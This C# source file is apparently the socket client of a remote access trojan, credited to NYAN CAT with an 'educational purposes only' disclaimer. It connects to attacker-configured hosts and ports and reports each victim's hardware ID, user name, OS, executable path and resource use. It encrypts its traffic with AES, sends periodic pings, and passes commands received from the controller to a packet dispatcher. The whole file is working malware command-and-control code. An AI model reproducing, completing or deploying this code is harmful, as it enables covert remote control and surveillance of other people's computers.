using Client.Handle_Packet;
using Client.Helper;
using Client.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Text;

//       │ Author     : NYAN CAT
//       │ Name       : Nyan Socket v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Client.Sockets
{
   public static class ClientSocket
    {
        public static Socket Client { get; set; }
        private static byte[] Buffer { get; set; }
        private static long Buffersize { get; set; }
        private static Timer Tick { get; set; }
        private static MemoryStream MS { get; set; }
        public static bool IsConnected { get; set; }
        private static object SendSync { get; } = new object();
        private static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        private static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");

        public static void InitializeClient()
        {
            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };
                Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]),
                    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                Debug.WriteLine("Connected!");
                IsConnected = true;
                Buffer = new byte[4];
                MS = new MemoryStream();
                Send(SendInfo());
                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
            }
        }

        public static void Reconnect()
        {

            try
            {
                Tick?.Dispose();
                Client?.Dispose();
                MS?.Dispose();
            }
            finally
            {
                InitializeClient();
            }
        }

        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = Methods.HWID();
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject("Version").AsString = Settings.Version;
            TheCPUCounter.NextValue();
            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
            return msgpack.Encode2Bytes();
        }

        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!Client.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }

                int recevied = Client.EndReceive(ar);
                if (recevied == 4)
                {
                    MS.Write(Buffer, 0, recevied);
                    Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                    Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                    MS.Dispose();
                    MS = new MemoryStream();
                    if (Buffersize > 0)
                    {
                        Buffer = new byte[Buffersize];
                        while (MS.Length != Buffersize)
                        {
                            int rc = Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
                            if (rc == 0)
                            {
                                IsConnected = false;
                                return;
                            }
                            MS.Write(Buffer, 0, rc);
                            Buffer = new byte[Buffersize - MS.Length];
                        }
                        if (MS.Length == Buffersize)
                        {
                            ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                            Buffer = new byte[4];
                            MS.Dispose();
                            MS = new MemoryStream();
                        }
                    }
                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!Client.Connected || !IsConnected)
                    {
                        IsConnected = false;
                        return;
                    }

                    if (msg == null) return;

                    byte[] buffer = Settings.aes256.Encrypt(msg);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    Client.Poll(-1, SelectMode.SelectWrite);
                    Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
                    Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
            Send(msgpack.Encode2Bytes());
        }

    }
}